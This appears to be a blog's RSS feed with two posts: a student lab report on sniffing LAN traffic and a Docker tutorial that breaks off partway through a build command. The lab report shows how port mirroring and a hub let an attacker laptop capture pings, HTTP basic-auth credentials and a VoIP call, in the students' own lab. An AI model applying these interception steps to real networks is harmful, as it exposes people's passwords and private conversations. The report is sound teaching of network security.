<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on silly blog</title>
    <link>http://localhost:1313/posts/</link>
    <description>Recent content in Posts on silly blog</description>
    <generator>Hugo -- 0.147.3</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 16 May 2025 02:36:09 +0200</lastBuildDate>
    <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Capturing Network traffic</title>
      <link>http://localhost:1313/posts/itsi/year-3/exercise-10/capturing-networn-traffic/</link>
      <pubDate>Fri, 16 May 2025 02:36:09 +0200</pubDate>
      <guid>http://localhost:1313/posts/itsi/year-3/exercise-10/capturing-networn-traffic/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex10/capturing-network-traffic-in-a-LAN.pdf&#34;&gt;here&lt;/a&gt; along with the &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex10/quellen.bib&#34;&gt;bibliography&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Laboratory protocol&lt;/strong&gt;&lt;br&gt;
Exercise 10: Capturing of network traffic in the local network&lt;br&gt;
&lt;figure&gt;
    &lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/itsi/y3/ex10/images/mencicle.png&#34;/&gt; &lt;figcaption&gt;
            Figure: Grouplogo
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;strong&gt;Subject:&lt;/strong&gt; ITSI&lt;br&gt;
&lt;strong&gt;Class:&lt;/strong&gt; 3AHITN&lt;br&gt;
&lt;strong&gt;Name:&lt;/strong&gt; Stefan Fürst, Justin Tremurici&lt;br&gt;
&lt;strong&gt;Group Name/Number:&lt;/strong&gt; Name here/12&lt;br&gt;
&lt;strong&gt;Supervisor:&lt;/strong&gt; SPAC, ZIVK&lt;br&gt;
&lt;strong&gt;Exercise dates:&lt;/strong&gt; 11.04.2025 | 25.04.2025 | 09.05.2025&lt;br&gt;
&lt;strong&gt;Submission date:&lt;/strong&gt; 16.05.2025&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-definition&#34;&gt;Task definition&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#complete-network-topology-of-the-exercise&#34;&gt;Complete network topology of the exercise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exercise-execution&#34;&gt;Exercise Execution&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#building-the-topologies&#34;&gt;Building the Topologies&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#mirroring-traffic-in-routeros-v7&#34;&gt;Mirroring traffic in RouterOS v7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#comparing-the-traffic-before-and-after-the-configuration&#34;&gt;Comparing the traffic before and after the configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#packet-sniffing-on-the-local-device&#34;&gt;Packet Sniffing on the Local Device&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#capturing-a-ping-between-two-targets&#34;&gt;Capturing a Ping Between Two Targets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#capturing-plain-text-passwords&#34;&gt;Capturing Plain Text Passwords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#capturing-a-voip-call&#34;&gt;Capturing a VoIP Call&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;task-definition&#34;&gt;Task definition&lt;/h2&gt;
&lt;p&gt;This task focused on the passive interception of network traffic in a local network using either a hub or a managed switch with mirror ports. The objective was to analyze unaltered communications using &lt;code&gt;Wireshark&lt;/code&gt; on both attacker and victim machines. Two topologies were tested: a hub-based setup, which allowed full traffic visibility, and a switch-based setup, where traffic was mirrored from victim ports to the attacker’s port. Devices were assigned static IP addresses from a private range, and VoIP communication was simulated using either software-based or physical IP phones.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex10/capturing-network-traffic-in-a-LAN.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex10/quellen.bib">bibliography</a></p></blockquote>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 10: Capturing of network traffic in the local network<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/mencicle.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
<strong>Group Name/Number:</strong> Name here/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 11.04.2025 | 25.04.2025 | 09.05.2025<br>
<strong>Submission date:</strong> 16.05.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition">Task definition</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#building-the-topologies">Building the Topologies</a></li>
<li><a href="#mirroring-traffic-in-routeros-v7">Mirroring traffic in RouterOS v7</a></li>
<li><a href="#comparing-the-traffic-before-and-after-the-configuration">Comparing the traffic before and after the configuration</a></li>
<li><a href="#packet-sniffing-on-the-local-device">Packet Sniffing on the Local Device</a></li>
<li><a href="#capturing-a-ping-between-two-targets">Capturing a Ping Between Two Targets</a></li>
<li><a href="#capturing-plain-text-passwords">Capturing Plain Text Passwords</a></li>
<li><a href="#capturing-a-voip-call">Capturing a VoIP Call</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<p>This task focused on the passive interception of network traffic in a local network using either a hub or a managed switch with mirror ports. The objective was to analyze unaltered communications using <code>Wireshark</code> on both attacker and victim machines. Two topologies were tested: a hub-based setup, which allowed full traffic visibility, and a switch-based setup, where traffic was mirrored from victim ports to the attacker’s port. Devices were assigned static IP addresses from a private range, and VoIP communication was simulated using either software-based or physical IP phones.</p>
<p>Three types of traffic were examined: ICMP echo requests (Ping), HTTP authentication involving plaintext credentials, and VoIP calls between two endpoints. Each case was recorded in a separate Wireshark capture. In the hub scenario, the focus was on visibility and potential stability issues under high traffic. For the switch, mirroring was configured and traffic was captured before and after to assess changes.</p>
<p>Further tasks involved filtering ICMP traffic by attacker IP, observing ping communication between victim devices from the attacker’s perspective, capturing HTTP login attempts to extract credentials, and intercepting a VoIP call, which was exported as an MP3 file. All relevant captures and the audio file were submitted as part of the final documentation.</p>
<hr>
<h2 id="summary">Summary</h2>
<p>In this exercise, two distinct network topologies were implemented to investigate passive network traffic interception. The first topology utilized personal hardware, specifically a Mikrotik RB5009 router, to configure port mirroring. The client devices were older laptops running Proxmox, with one laptop hosting an nginx container configured to demonstrate basic HTTP authentication. The attacker device was another laptop connected to the mirrored ports on the router, which allowed it to receive a complete copy of the network traffic between the clients and the server.</p>
<p>The initial step involved performing local ICMP ping requests from the attacker to the clients to observe the captured traffic and verify network connectivity. Following this, the two client laptops pinged each other, while the attacker monitored and recorded the exchanged packets. This demonstrated the attacker&rsquo;s ability to intercept traffic not directly addressed to it due to the port mirroring setup. Furthermore, the attacker was able to capture and analyze the HTTP basic authentication process, successfully extracting plaintext credentials transmitted from the client to the nginx server.</p>
<p>In the second part of the exercise, a VoIP call was established using two IP phones connected via a network hub instead of a switch with port mirroring. This topology allowed the attacker laptop to capture the audio stream of the call directly from the network traffic. The recorded audio was then exported and post-processed using Audacity and Adobe Podcast Speech Enhancer to clean and enhance the recording, resulting in a clear and intelligible audio file.</p>
<p>Throughout the exercise, Wireshark was extensively used to capture, filter, and analyze the network traffic from the attacker’s perspective. This practical approach provided insight into how network devices like hubs and switches with port mirroring impact the visibility of traffic and the feasibility of passive interception attacks within a local network environment.</p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise</h2>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/topo1.png"/> <figcaption>
            Figure 1: Complete network topology of the exercise using a switch
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/topo2.png"/> <figcaption>
            Figure 2: Complete network topology of the exercise using a Hub
        </figcaption>
</figure>
</p>
<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="building-the-topologies">Building the Topologies</h3>
<p>To build the topology from Figure 1, I chose the following hardware: a Mikrotik RB 5009 to act as the main &ldquo;switch&rdquo; due to RouterOS offering extensive settings in what I consider the best GUI to manage any network device.</p>
<p>For the server and clients, I used two old laptops running Proxmox, one of which has a Debian server VM running an Nginx web server with basic authentication set up. All of the devices have static IPs configured in the range <code>10.30.0.0/24</code>. The attacker simply runs Linux with Wireshark to capture the traffic. The used IP addresses can be found in the addressing table below.</p>
<table>
  <thead>
      <tr>
          <th>Device</th>
          <th>IP</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Attacker</td>
          <td>10.30.0.69</td>
      </tr>
      <tr>
          <td>Server</td>
          <td>10.30.0.179</td>
      </tr>
      <tr>
          <td>Webserver</td>
          <td>10.30.0.10</td>
      </tr>
      <tr>
          <td>Client</td>
          <td>10.30.0.179</td>
      </tr>
  </tbody>
</table>
<hr>
<h3 id="mirroring-traffic-in-routeros-v7">Mirroring traffic in RouterOS v7</h3>
<p>To configure the router, there are three options: either use the WebGUI, SSH into it, or use their program called WinBox, which is the option I went with. After connecting a port on the router, it automatically detects available ports, and I can simply select one of them and configure everything as needed via the MAC address.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/winbox.png"/> <figcaption>
            Figure 3: Connecting to the Router via Winbox
        </figcaption>
</figure>

<p>Now that we are in the router&rsquo;s configuration, we see a number of top-level options to choose from. To mirror traffic, we go to the Switch section and head to the Port tab, where we select the ports we want to mirror. If we double-click on an interface, it opens the port window, where we can choose whether to mirror only ingress traffic, egress traffic, or both.</p>
<p>We also specify an ingress target, which in this case is ether6, where the attacker&rsquo;s laptop is plugged in so that it receives all the mirrored traffic. The configuration for both ether7 and ether8 is the same, which is why only one is shown below. Lastly, under the &ldquo;Mirror Ingress&rdquo;/&ldquo;Mirror Egress&rdquo; columns in the switch window table, we can see a &ldquo;yes&rdquo; in both columns, indicating that the configuration has been successfully applied.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/routerconf.png"/> <figcaption>
            Figure 4: Examining the traffic mirror configuration
        </figcaption>
</figure>

<hr>
<h3 id="comparing-the-traffic-before-and-after-the-configuration">Comparing the traffic before and after the configuration</h3>
<p>Now we can use Wireshark on the attacker&rsquo;s laptop to compare the traffic captured with and without mirroring.</p>
<p>When everything is idle and only ARP traffic is occurring in the background, the only difference is that instead of receiving each broadcast once, it is received twice—once from the connection itself and once from the mirroring.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/nomirr.png"/> <figcaption>
            Figure 5: Examining the arp traffic without a mirror configuration
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/yesmirr.png"/> <figcaption>
            Figure 6: Examining the arp traffic with a mirror configuration
        </figcaption>
</figure>
</p>
<hr>
<h3 id="packet-sniffing-on-the-local-device">Packet Sniffing on the Local Device</h3>
<p>Now, with mirroring enabled, every device on the network is pinged so we can examine the behavior using the following filter: <code>ip.src == 10.30.0.69 &amp;&amp; icmp</code>. This filter shows only ICMP frames with the source IP of the attacker&rsquo;s laptop.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/ws2_1.png"/> <figcaption>
            Figure 7: Displaying the pings to every device on the Network
        </figcaption>
</figure>

<p>To display only the full connection between the two devices, the following filter can be used to show only the complete exchange, including replies: <code>icmp &amp;&amp; ip.addr == 10.30.0.69 &amp;&amp; ip.addr == 10.30.0.178</code>.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/filter%20for%20cumm.png"/> <figcaption>
            Figure 8: Displaying the full ping between the attacker and a client
        </figcaption>
</figure>

<hr>
<h3 id="capturing-a-ping-between-two-targets">Capturing a Ping Between Two Targets</h3>
<p>Since all ingress and egress traffic is being mirrored to the attacker&rsquo;s port, it is possible to observe the entire ICMP exchange between the two victim machines directly from the attacker&rsquo;s PC using Wireshark. If a ping is initiated between the two devices, we can apply the same filter as before—replacing the IP addresses with those of the communicating victims—to capture and analyze the exchanged packets.</p>
<pre tabindex="0"><code>ip.addr == &lt;Victim1_IP&gt; &amp;&amp; ip.addr == &lt;Victim2_IP&gt;
</code></pre><p>As shown below, this traffic is visible only from the attacker&rsquo;s Wireshark capture. The source and destination fields in the packets correspond to the two victim machines—at no point does the attacker’s IP address appear in the captured communication. This interception is possible solely due to port mirroring: all network traffic to and from the mirrored ports is duplicated to the attacker&rsquo;s port. The two clients are unaware of this and communicate normally, while the attacker silently captures their traffic.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/whistBaa.png"/> <figcaption>
            Figure 9: Observing a Ping Between Two Clients That Don&#39;t Involve the Attacker
        </figcaption>
</figure>

<hr>
<h3 id="capturing-plain-text-passwords">Capturing Plain Text Passwords</h3>
<p>But let&rsquo;s not stop at having two targets ping each other—we can also make use of the web server VM, which is simply the default Nginx page protected with basic authentication. If we make a request to the HTTP server—using either a web browser, curl, or any other method—and pass the Authorization header, it will contain Basic, which is the scheme name, followed by a Base64-encoded UTF-8 string of the username and password separated by a colon <code>:</code>.  <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>The server then checks whether the provided credentials match an entry in the credentials file. If no match is found, an HTTP status code 401 Unauthorized is returned.  <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<p>Later, a successful authentication is made, where the server instead returns status code 200, which indicates that the request has succeeded.  <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<p>Again, we can see the credentials used in the request headers and now know that the credentials for this web server are <code>user3:password123</code>, as shown below. In addition, we receive the entire HTML code returned in the response from the server, which we can also view in plain text—essentially allowing us to see the same content as the client.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/headhgoog.png"/> <figcaption>
            Figure 11: Viewing the correct plain text password from the authentication
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/eniterufcijsdigjsdg.png"/> <figcaption>
            Figure 12: Viewing the returned HTML
        </figcaption>
</figure>
</p>
<p><em>See also: <a href="https://stefanistkuhl.github.io/posts/itsi/year-3/exercise-6/linux-hadening-nginx">Exercise 6: Hardening a Linux Webserver</a> for details on setting up Nginx with basic authentication.</em><sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup></p>
<hr>
<h3 id="capturing-a-voip-call">Capturing a VoIP Call</h3>
<p>Lastly, VoIP traffic was captured and analyzed using Wireshark. For this, a different topology was used, as shown in Figure 2, since I do not own any VoIP phones. This part of the experiment was conducted in the school&rsquo;s networking lab, where we used a hub and the address range <code>10.0.0.0/24</code>. The attacker had the address <code>10.0.0.69</code>, while the two phones had <code>10.0.0.1</code> and <code>10.0.0.2</code>. Since a hub was used, no port mirroring had to be configured.</p>
<p>Voice over IP is an unencrypted protocol that uses the Real-time Transport Protocol (RTP) to transmit application data, which Wireshark has built-in tools to follow and even convert back into audio.  <sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> <sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup></p>
<p>Wireshark provides these tools under Telephony → VoIP, which automatically detects the relevant streams and identifies the speakers. In the window that opens, we have several options, such as viewing the Flow Sequence, which shows when the call was ringing and who was speaking when. However, we are more interested in the &ldquo;Play Streams&rdquo; button, which displays the waveform of the call and allows us to export the audio as an MP3 file.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/phonedge.png"/> <figcaption>
            Figure 13: Viewing the VoIP menu in Wireshark
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/waow.png"/> <figcaption>
            Figure 14: Viewing the Waveform of the call
        </figcaption>
</figure>
</p>
<p>However, the audio levels of the MP3 were initially unbalanced—the beginning was far too quiet—so I boosted the volume using Audacity to normalize the audio levels. I then used the Adobe Podcast AI Audio Enhancer to remove background noise and isolate the conversation. The result was a surprisingly clean and understandable audio file, even though the microphone of the other phone was quite far away when I was speaking.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/fixing%20levels.png"/> <figcaption>
            Figure 15: Fixing the Audio Levels in Audacity
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex10/images/adobe%20podcast.png"/> <figcaption>
            Figure 16: Removing Background Noise Using Adobe&#39;s Podcast Tool
        </figcaption>
</figure>
</p>
<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex10/quellen.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Joey. Mirroring ports on Mikrotik. Blogger, 2015. <a href="https://www.technicallyinsane.com/2015/10/mirroring-ports-on-mikrotik.html">link</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>RFC 7617. <a href="https://www.rfc-editor.org/rfc/rfc7617.txt">link</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>401 Unauthorized - HTTP | MDN. <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/401">link</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>200 OK - HTTP | MDN. <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/200">link</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Hardening a Linux Webserver, Exercise 6. <a href="https://stefanistkuhl.github.io/posts/itsi/year-3/exercise-6/linux-hadening-nginx">link</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>VoIP_calls - Wireshark Wiki. <a href="https://wiki.wireshark.org/VoIP_calls">link</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>RTP - Wireshark Wiki. <a href="https://wiki.wireshark.org/RTP">link</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Docker Things</title>
      <link>http://localhost:1313/posts/docker-things/</link>
      <pubDate>Wed, 14 May 2025 19:40:14 +0200</pubDate>
      <guid>http://localhost:1313/posts/docker-things/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;The code for all setups is available on my GitHub &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/tree/master/things/silly_docker_guide&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;docker-crash-course&#34;&gt;Docker crash course&lt;/h1&gt;
&lt;h2 id=&#34;what-is-docker&#34;&gt;What is docker?&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker&amp;rsquo;s methodologies for shipping, testing, and deploying code, you can significantly reduce the delay between writing code and running it in production.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>The code for all setups is available on my GitHub <a href="https://github.com/Stefanistkuhl/goobering/tree/master/things/silly_docker_guide">here</a>.</p></blockquote>
<h1 id="docker-crash-course">Docker crash course</h1>
<h2 id="what-is-docker">What is docker?</h2>
<blockquote>
<p>Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker&rsquo;s methodologies for shipping, testing, and deploying code, you can significantly reduce the delay between writing code and running it in production.</p></blockquote>
<h2 id="why-use-it">Why use it?</h2>
<ul>
<li>
<p>Makes building and running apps easier and faster</p>
<ul>
<li>Keeps the app separate from the computer it runs on, so it works the same anywhere (your PC, a server, or the cloud)</li>
<li>Helps you update and deliver new versions quickly</li>
<li>Makes sure the app runs the same every time, no matter where it’s deployed</li>
<li>Saves time when moving from writing code to actually using it</li>
</ul>
</li>
<li>
<p>Lets you use and manage different versions of software</p>
<ul>
<li>You can run older or specific versions of apps without messing up your system</li>
<li>Useful if your project needs a tool that only works with a certain version</li>
</ul>
</li>
<li>
<p>Runs apps in isolated containers</p>
<ul>
<li>Each app runs in its own “box,” separate from others, which makes it safer and easier to manage</li>
<li>You can test apps without affecting the rest of your system</li>
</ul>
</li>
<li>
<p>Great for home setups and personal servers</p>
<ul>
<li>Run things like a media server (e.g. Jellyfin), game server, or home automation tools (e.g. Home Assistant) in containers</li>
<li>Keeps each service isolated, so if one breaks, the others keep working</li>
<li>Easy to back up, move, or update your services</li>
</ul>
</li>
</ul>
<h2 id="how-does-it-work">How does it work?</h2>
<h3 id="docker-vs-vms">Docker vs VMS</h3>
<p>Both technologies aim to achieve a similar goal: providing an isolated environment to deploy applications. However, they do it differently-containers share the host system’s operating system, while virtual machines run their own full operating systems using a hypervisor.</p>
<ul>
<li>Startup Time
<ul>
<li>Containers: Start in seconds.</li>
<li>VMs: Can take up to minutes to boot.</li>
</ul>
</li>
<li>Resource Usage
<ul>
<li>Containers: Very light weight.</li>
<li>VMs: Require more processing power.</li>
</ul>
</li>
<li>Storage Size
<ul>
<li>Containers: from a few MBs to a few hundres.</li>
<li>VMs: several GBs.</li>
</ul>
</li>
<li>Operating System
<ul>
<li>Containers: Share the host OS kernel.</li>
<li>VMs: Each has its own full OS.</li>
</ul>
</li>
<li>Portability
<ul>
<li>Containers: Made to be moved and deployed everywhere</li>
<li>VMs: Slow to migrate due to large sizes
<img loading="lazy" src="https://media.geeksforgeeks.org/wp-content/uploads/20230109130229/Docker-vs-VM.png">
Image from <a href="https://www.geeksforgeeks.org/docker-or-virtual-machines-which-is-a-better-choice/">Geeks for Geeks</a></li>
</ul>
</li>
</ul>
<h2 id="docker-ussage-basics">Docker ussage basics</h2>
<p>To demonstrate the basic uses of Docker, I will deploy the same simple Go and HTML app five times. First, I&rsquo;ll deploy it without Docker to show how it works normally. Then, I&rsquo;ll build custom Docker containers for the backend and frontend. Next, I&rsquo;ll use Docker Compose, followed by deploying it on a remote host using Docker Context. Finally, I&rsquo;ll use Docker Swarm with a Docker Stack to enable replicas and orchestration.</p>
<h3 id="deploying-without-docker">Deploying without Docker</h3>
<p>I created a simple Go web server with one API endpoint. This endpoint is called by JavaScript in an HTML file, which is served by Nginx. Nginx also handles routing to the API.
To deploy this, I need to run the Go server, configure Nginx, and place the HTML file in the correct location. Here&rsquo;s the current structure of my project:</p>
<pre tabindex="0"><code>├── backend
│   ├── go.mod
│   └── main.go
├── frontend
│   └── index.html
└── nginx
    └── nginx.conf
</code></pre><p>To simplify setup, I created a symbolic link from my custom Nginx config to the system config path using:</p>
<p><code>sudo ln -s /full/path/to/your/nginx.conf /etc/nginx/nginx.conf</code></p>
<p>Normally, Nginx configs should be split into separate files per site (virtual hosts), but since I&rsquo;m only hosting this one project, I modified the main config directly. Note: this is not best practice, but it&rsquo;s acceptable for quick testing.
I also symlinked the index.html file to Nginx’s web root so it can serve it:</p>
<p><code>sudo ln -s /full/path/to/your/index.html /usr/share/nginx/html/index.html</code></p>
<p>Now, by opening a terminal in the backend directory and running:</p>
<p><code>go run main.go</code></p>
<p>&hellip;and enabling Nginx using systemd or another method, I can visit localhost in a browser and see the webpage. If I want to make changes, I can edit the HTML file and refresh the page, or update the Go code, stop the server, and run it again.
While this setup might work fine for local development, it&rsquo;s too much hassle to repeat for every project. As soon as you need to collaborate with others or deploy to a server, it becomes inefficient and error-prone.
For example, to deploy this on a remote server, I’d have to manually copy the files, place them in the right locations, and start the services. I’d also have to repeat this process for every update—which is awful.</p>
<h3 id="using-docker">Using Docker</h3>
<p>Now let’s use Docker to deploy this app and demonstrate the basic features needed to create, deploy, and manage containers—improving the deployment with each iteration.
Updated Directory Structure</p>
<p>First, I changed the directory structure to include a Dockerfile for the backend. This file contains instructions that Docker uses to build an image, which can then be deployed as a container.</p>
<pre tabindex="0"><code>├── backend
│   ├── Dockerfile
│   ├── go.mod
│   └── main.go
├── frontend
│   └── index.html
└── nginx
    └── nginx.conf
</code></pre><p>Let’s examine the <code>Dockerfile</code> to understand how a container is built:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> golang:1.22-alpine</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> . .<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> go build -o main .<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 3000</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;./main&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h3 id="explanation-of-each-dockerfile-instruction">Explanation of Each Dockerfile Instruction</h3>
<ul>
<li>
<p><strong><code>FROM golang:1.22-alpine</code></strong><br>
Every <code>Dockerfile</code> starts with the <code>FROM</code> instruction, which specifies the <strong>base image</strong>. In this case, we’re using Go version 1.22 on Alpine Linux. Alpine is a minimal Linux distribution designed for containers and is only a few hundred megabytes in size.</p>
</li>
<li>
<p><strong><code>WORKDIR /app</code></strong><br>
This sets the working directory inside the container. All subsequent instructions will be executed from this directory unless changed.</p>
</li>
<li>
<p><strong><code>COPY . .</code></strong><br>
This copies all files from the current host directory (where the Dockerfile is located) into the working directory of the container. You could also list specific files instead. To exclude files or folders, you can use a <code>.dockerignore</code> file in the same directory.</p>
</li>
<li>
<p><strong><code>RUN go build -o main .</code></strong><br>
This command compiles the Go source code into a binary named <code>main</code>.</p>
</li>
<li>
<p><strong><code>EXPOSE 3000</code></strong><br>
This tells Docker that the application listens on port 3000. It doesn’t actually expose the port when running the container—it just documents the port for later mapping.</p>
</li>
<li>
<p><strong><code>CMD [&quot;./main&quot;]</code></strong><br>
This defines the default command to run when the container starts. In this case, it runs the compiled Go binary.</p>
</li>
</ul>
<blockquote>
<p>The resulting image is about 303 MB in size. This could be significantly reduced by using a <strong>multi-stage build</strong>—first using the base image with the OS and Go tools to compile the binary, and then copying just the compiled binary into a minimal final image. Since this process is straightforward and well-documented, I chose not to cover it in detail here to keep things focused.</p></blockquote>
<p>To actually build this container, the following command is used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker buildx build -t manual-backend backend
